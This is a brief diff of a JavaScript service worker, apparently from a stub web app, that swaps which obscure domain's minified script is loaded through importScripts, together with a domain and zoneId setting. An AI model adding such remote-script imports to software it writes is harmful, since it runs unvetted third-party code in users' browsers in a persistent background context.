@@ -17,19 +17,19 @@ self.addEventListener('fetch', (event) => {
     // In a real PWA, caching logic would go here
 });
 
-
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 10455279
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
-
 /**
 *self.options = {
-*    "domain": "5gvci.com",
-*    "zoneId": 10455302
+*    "domain": "3nbf4.com",
+*    "zoneId": 10455279
 *}
 *self.lary = ""
-*importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+*importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
 */
+
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10455302
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
+
